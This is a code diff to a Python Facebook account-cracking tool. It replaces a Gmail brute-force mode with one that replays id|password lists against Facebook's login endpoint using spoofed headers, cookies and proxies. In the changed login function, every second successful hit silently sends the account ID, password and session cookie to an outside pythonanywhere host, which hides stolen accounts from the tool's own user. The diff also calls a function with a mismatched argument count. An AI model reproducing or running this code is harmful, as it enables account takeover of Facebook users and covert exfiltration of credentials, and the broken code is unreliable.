@@ -458,7 +458,7 @@ def menu():
     print("[1] FILE   CLONING =>")
     print("[2] RANDOM CLONING =>")
     print("[3] PUBLIK CLONING =>")
-    print("[4] GMAIL  CLONING =>")
+    print("[4] CP RE-LOGIN    =>")
     print("[5] CONTACT (WHATSAPP) ")
     print("[6] EXIT TOOL ")
     linex()
@@ -466,7 +466,7 @@ def menu():
     if bithi =='1':f_clone()
     elif bithi =='2':r_clone()
     elif bithi =='3':n_clone()
-    elif bithi =='4':g_clone()
+    elif bithi =='4':SUMONCP()
     elif bithi =='5':os.system("xdg-open ");menu()
     elif bithi =='6':exit()
     else:
@@ -930,55 +930,45 @@ def n_clone():
     divider()
     exit()
 
-def g_clone():
-    user=[]
+def SUMONCP():
+    global oks, cps
+    oks = []
+    cps = []
+
     os.system('clear')
-    print(logo)
-    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    first = random.randint('sumon','rakesh','rahul','raj','joy','pritam','sayan','ramesh','sagar','debraj','avi','abinash','ujjal','rakesh','subho','rakesh','akash','abhijit','abir','aditya','amit','arjun','bapi','basu','bikash','bikram','deep','dev','dipankar','gautam','jaydeb','kamal','lakesh','polash','rajib','sourav','sujay','sujit','anik',)
-    last = random.choice(['roy','das','sarkar','mondal','biswas','ghosh','saha','haldar','pal','ray',])
-    domain = '@gmail.com'
+    LOGI()
+
+    dfile = input(f'\x1b[38;5;86m[/] EXAMPLE \033[1;91m[sdcard/mahadi.txt]\n\x1b[38;5;87m[\] ENTER FILE PATH : ')
     try:
-        limit = int(input(' [:] Crack Limit : '))
-    except ValueError:
-        limit = 5000
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(4))
-        user.append(nmp)
-    clear()
-    print("                CHOOSE METHOD                       ")
-    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    print(" [1] METHOD (METHOD1) ")
-    linex()
-    SUMONfire = input("[+] [CHOOSE] :- ")
-    linex()
-    print(" [?] Do You Want To Show Cookies : (Y/N) ")
-    linex()
-    c = input(" [?] Input : ")
-    if c in ["Y", "y"]:
-        cookie_show.append("yes")
-    else:
-        cookie_show.append("no")
-    with ThreadPool(max_workers=30) as SUMON_xd:
-        tl = str(len(user))
-        os.system("clear")
-        print(logo)
-        print(f'{green}=> BE PATIENT BABY ')
-        print(f'{green}=> TOTAL LIMID : \033[1;32m'+tl)
-        print(f'{green}=> USE FLIGHT MODE ')
-        print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-        for love in user:
-            nmn = first+last
-            uid = nmn+love+domain
-            pwx = [nmn,first+'12',first+'123',first+'1234',first+'12345']
-            if SUMONfire =='1':SUMON_xd.submit(mail,uid,pwx,first,tl)
-            else:
-                SUMON_xd.submit(mail,uid,pwx,first,tl)
-    linex()
-    print('[] CRACK PROCESS COMPLETE')
-    print('[] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[] ID SAVE SUMON-OK TXT')
-    linex()
+        dx = open(dfile, 'r').read().splitlines()
+    except FileNotFoundError:
+        print(f'{rad}[×] FILE NOT FOUND...')
+        time.sleep(1)
+        return
+
+    if not dx:
+        print(f'{rad}[×] FILE IS EMPTY...')
+        time.sleep(1)
+        return
+
+    for user in dx:
+        os.system('clear')
+        LOGI()
+        print(f"{green}[{rad}+{green}] PROCESSING ONE ID...")
+        linex()
+
+        try:
+            ids, pas = user.split('|')
+            ids = ids.strip()
+            pas = pas.strip()
+        except:
+            continue  # skip bad lines
+
+        __Fire__(ids, "", [pas])  # pass password as list with one item
+
+        print(f"{green}[{rad}+{green}] PROCESS COMPLETE.")
+        linex()
+        input("PRESS ENTER TO LOGIN NEXT ID...")
 
 def ____PO_CO____():
     version_choices = ['14', '15', '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', '8.0.0', '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', '6.0.1', '9.0.1']
@@ -2185,48 +2175,58 @@ def cracker(uid, pwx, tl):
     except Exception as error:
         #print({error})
         pass
-def mail(uid,pwx,first,tl):
+
+def __Fire__(ids,pas):
     global oks
     global cps
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(BITHIKA) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.write(f"\r {green}(M5) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
-        for pw in pwx:
+        for pw in pas:
+            nip=random.choice(xvx)
+            proxs= {'http': nip}
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com/').text
+            free_fb = Session.get('https://m.facebook.com').text
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'email': uid,
-            'cred_type': '100',
-            'login_source': 'device_based_login_add_account',
-            'savepass': '',
-            'next': '',
-            'persistent': '',
-            'encpass':"#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            'email': ids,
+            'timezone': '-330',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+            'lgnrnd': '060331_lb2E',
+            'lgnjs': '1751375011',
+            'ab_test_data': '/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/ffPPfPAABFAI',
+            'locale': 'hi_IN',
+            'next': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
+            'guid': 'f13465d1007fbcb28',
+            'prefill_contact_point': '',
+            'prefill_source': 'browser_dropdown',
+            'prefill_type': 'password',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            print(data)
             cookies = {
-            'ps_n': '1',
+            'datr': 'kqFRaB1m-_9lS30TJrCcYC28',
+            'sb': 'kqFRaADAhKyR-m_DobFeaU6C',
             'ps_l': '1',
-            'sb': 'vv1mZoqkaQr8BYILQ8WaAKOT',
-            'datr': 'PJp1ZglQIotPNJW3IGpT68nu',
-            'wd': '1034x797',
-            'fr': '1rNHx4L9yZvgxejws.AWUCkkkekZOLf_Oltp7e4RYPNjiPYaBt9V1xtw.BnXFu6..AAA.0.0.BnvJEQ.AWW1nnknVmY',}
+            'ps_n': '1',
+            'locale': 'hi_IN',
+            'fr': '0ugbVyuFAdiFSXbdX..BoUaGS..AAA.0.0.BoY9wG.AWcLS89ZvTPUI126sFbmRUmbVYc',
+            'wd': '885x751',}
             headers = {
+            'authority': 'www.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
+            'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
             'dpr': '1',
-            'origin': 'https://web.facebook.com',
-            'pragma': 'no-cache',
-            'priority': 'u=0, i',
-            'referer': 'https://web.facebook.com/?ref=homescreenpwa',
+            'origin': 'https://www.facebook.com',
+            'referer': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
             'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
-            'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.82", "Chromium";v="133.0.6943.127"',
+            'sec-ch-ua': '"Not=A?Brand";v="99", "Chromium";v="118"',
+            'sec-ch-ua-full-version-list': '"Not=A?Brand";v="99.0.0.0", "Chromium";v="118.0.5993.159"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-model': '""',
             'sec-ch-ua-platform': '"Windows"',
@@ -2236,12 +2236,11 @@ def mail(uid,pwx,first,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
-            'viewport-width': '1034',}
-            print(data)
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+            'viewport-width': '885',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://web.facebook.com/login/device-based/regular/login/'
-            po = Session.post(url, cookies=cookies, headers=headers, data=data).text
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110'
+            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
@@ -2254,11 +2253,16 @@ def mail(uid,pwx,first,tl):
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
-                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                        print(f" {green}Cookie : {green}{coki}")
-                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        oks.append(cid)
-                        break
+                        bkas.append(cid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{cid}|{pw}|{coki}")
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
                 else:
                     break
             elif 'checkpoint' in response:
